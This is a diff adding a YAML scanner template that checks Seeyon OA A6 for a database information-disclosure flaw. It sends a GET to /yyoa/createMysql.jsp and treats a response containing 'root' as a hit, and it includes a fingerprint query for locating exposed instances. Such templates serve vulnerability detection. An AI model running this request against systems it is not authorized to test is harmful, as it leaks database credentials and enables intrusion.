@@ -1,0 +1,19 @@
+name: Seeyon_OA_A6__Disclosure_of_database_sensitive_information
+transport: http
+set: {}
+detail:
+  dock: app="Yonyou-Seeyon-OA" && body="致远协创A6"
+  product: Seeyon OA A6
+  homepage: https://www.seeyon.com/
+  impact: <p>The attacker can access the specific URL to obtain the database account
+    and password MD5<br></p>
+  description: Seeyon OA A6 has database sensitive information disclosure. Attackers
+    can obtain database account and password MD5 by accessing specific URL
+rules:
+  r1:
+    method: GET
+    path: /yyoa/createMysql.jsp
+    follow_redirects: true
+    headers: {}
+    expression: response.status == 200 && response.body.bcontains(b'root')
+expression: r1()
